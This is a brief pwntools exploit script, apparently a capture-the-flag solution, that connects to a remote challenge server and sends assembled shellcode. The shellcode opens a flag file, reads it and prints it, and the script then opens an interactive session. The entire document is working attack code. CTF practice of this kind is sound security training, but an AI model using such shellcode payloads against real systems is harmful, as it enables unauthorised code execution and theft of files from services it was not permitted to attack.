from pwn import *

context(arch='amd64', os = 'linux', log_level = 'debug')
io = remote("node5.anna.nssctf.cn", 24168)
#io = process("./mymem")

payload = asm(shellcraft.open("/home/ctf/flag.txt", 0) + shellcraft.read(3, 0x50900, 100) + shellcraft.write(1, 0x50900, 100))
io.sendline(payload)
io.interactive()
